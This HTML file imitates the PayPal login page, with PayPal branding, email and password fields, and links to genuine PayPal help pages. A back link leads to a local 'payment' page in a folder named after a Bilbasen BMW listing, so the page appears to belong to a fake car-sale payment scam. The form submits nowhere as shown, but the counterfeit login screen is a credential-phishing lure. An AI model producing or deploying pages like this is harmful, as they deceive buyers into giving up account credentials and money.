<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion PayPal</title>
    <link rel="icon" type="image/png" href="paypal.png">
    <link rel="apple-touch-icon" href="paypal.png">
    <link rel="stylesheet" href="style.css">
    <!-- FontAwesome pour les icônes -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/6.6.6/css/flag-icons.min.css">
</head>
<body>
    <div class="breadcrumb-bar">
        <a href="C:\Users\SOSO\Downloads\Bilbasen\BMW 330i M-Sport  2019\payment/payment.html" class="back-link"> < Back </a>
    </div>
    <div class="container">
        <!-- Logo PayPal (SVG officiel simplifié) -->
        <div class="logo">
            <span class="paypal-blue">Pay</span><span class="paypal-darkblue">Pal</span>
        </div>

        <!-- Formulaire de saisie -->
        <form action="">
            <div class="form-group">
                <div class="input-container">
                    <input type="text" placeholder="Email address or mobile number" required>
                </div>
            </div>
    
            <div class="form-group">
                <div class="input-container">
                    <input type="text" placeholder="Password" required>
                </div>
            </div>
    
            <div class="forgot-link">
                <a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin%253Flocale.x%253Dfr_XC">Forgot email address?</a>
                <a href="https://www.paypal.com/authflow/password-recovery/?country.x=BJ&locale.x=fr_XC&pwrMayflyId=pwr%3Ae28a76e19198483099109d6f91766928&redirectUri=%252Fsignin%253Flocale.x%253Dfr_XC">Forgot password?</a>
            </div>
    
            <button type="submit" class="btn-primary">Log in</button>
        </form>

        <div class="separator">
            <span>or</span>
        </div>

        <a href="https://www.paypal.com/welcome/signup" class="btn-secondary">Create an account</a>
        <div class="language-selector">
            <span class="fi fi-us fis"></span>
            <select aria-label="Langue">
                <option value="dk">Dansk</option>
                <option value="en" selected>English</option>
                <option value="fr">French</option>
            </select>
        </div>
    </div>

    <!-- Pied de page -->
    <footer>
        <a href="https://www.paypal.com/bj/smarthelp/contact-us">Contact</a>
        <a href="https://www.paypal.com/bj/webapps/mpp/ua/privacy-full">Privacy Policy</a>
        <a href="https://www.paypal.com/bj/webapps/mpp/ua/legalhub-full">Terms of Use</a>
        <a href="https://www.paypal.com/bj/webapps/mpp/country-worldwide">International</a>
    </footer>

</body>
</html>
